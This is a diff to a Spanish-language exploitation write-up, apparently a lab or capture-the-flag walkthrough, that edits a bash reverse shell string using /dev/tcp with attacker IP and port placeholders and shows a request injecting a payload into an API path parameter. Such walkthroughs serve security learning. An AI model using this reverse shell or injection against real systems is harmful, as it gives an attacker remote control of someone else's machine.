@@ -330,7 +330,7 @@ vamos a remplazar el `netcat` por un `bash -c`
 
 `reverse shell en bash`
 ```python
-"bash -c 'bash -i >& /dev/tcp/{0}/{1} 0>&1'"
+"bash -c '/bin/bash -i >& /dev/tcp/{0}/{1} 0>&1'"
 ```
 
 básicamente debemos agregar una reverse shell en bash y agregando las variables `{0}/{1}` las cuales hacen referencia a la dirección ip y el puerto.
@@ -391,4 +391,4 @@ step4 = req.get(url+"~/api/get_ls?path=/tmp/"+payload, headers=headers)
 
 ### reverse shell
 
-![[Pasted image 20240823162146.png]]
+![[Pasted image 20240823162631.png]]
